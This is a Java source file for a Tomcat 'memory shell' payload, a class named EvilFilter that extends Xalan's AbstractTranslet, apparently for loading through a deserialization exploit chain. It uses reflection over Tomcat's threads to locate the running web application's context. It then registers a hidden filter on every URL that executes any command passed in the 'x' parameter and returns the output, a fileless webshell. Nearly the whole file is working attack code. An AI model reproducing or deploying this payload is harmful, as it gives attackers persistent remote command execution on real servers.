import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardHost;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Iterator;

/**
 * tomcat678 currentThread -> threadGroup -> for(threads) ->target
 *     ->this$0->handler->proto->adapter->connector->service->container
 *         ->children(一个HashMap，get获取standardHost)->standardHost->children(一个HashMap，get获取standardContext)
 * */
public class EvilFilter extends AbstractTranslet{
    String uri;
    String serverName;
    StandardContext standardContext;

    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public void getStandardContext() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            // 过滤掉不相关的线程
            if (!thread.getName().contains("StandardEngine")) {
                continue;
            }

            Object target = getField(thread, "target");
            if (target == null) { continue; }
            HashMap children;

            try {
                children = (HashMap) getField(getField(target, "this$0"), "children");
                StandardHost standardHost = (StandardHost) children.get(this.serverName);
                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(this.uri.startsWith(contextKey))){continue;}
                    // /spring_mvc/home/index startsWith /spring_mvc
                    StandardContext standardContext = (StandardContext) children.get(contextKey);
                    this.standardContext = standardContext;
//                    System.out.println(this.standardContext);
                    // 添加内存马
                    memshell(this.standardContext);
                    return;
                }
            } catch (Exception e) {
                continue;
            }
            if (children == null) {
                continue;
            }
        }
    }

    public EvilFilter() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {

            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)){continue;}
                // 不是对应的请求时，serverPort = -1
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null){
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null){
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null){
                    this.uri = uriMB.toString();
                }
                if (this.uri == null){
                    this.uri = uriMB.getString();
                }

                this.getStandardContext();
                return;
            }
        }
    }

    public void memshell(StandardContext standardContext) {
        try {
            final String filterName = "ricky";
            // WebappClassLoaderBase--->ApplicationContext(getResources().getContext())
//            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
//            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {
                }
                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest request = (HttpServletRequest) servletRequest;
                    if(request.getParameter("x") != null){
                        Process process = Runtime.getRuntime().exec(request.getParameter("x"));
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String str = "";
                        String line;
                        while((line = reader.readLine()) != null){
                            str += line;
                        }
                        servletResponse.getOutputStream().write(str.getBytes());
                        servletResponse.getOutputStream().flush();
                        servletResponse.getOutputStream().close();
                    }
                    filterChain.doFilter(servletRequest, servletResponse);
                }
                @Override
                public void destroy() {
                }
            };

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);

            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterName);
            filterMap.addURLPattern("*");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            Constructor<?>[] constructors = ApplicationFilterConfig.class.getDeclaredConstructors();
            constructors[0].setAccessible(true);
            ApplicationFilterConfig config = (ApplicationFilterConfig) constructors[0].newInstance(standardContext, filter);

            Field configfield = standardContext.getClass().getDeclaredField("filterConfigs");
            configfield.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) configfield.get(standardContext);
            filterConfigs.put(filterName, config);

            standardContext.addFilterDef(filterDef);
            standardContext.addFilterMapBefore(filterMap);

        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

}


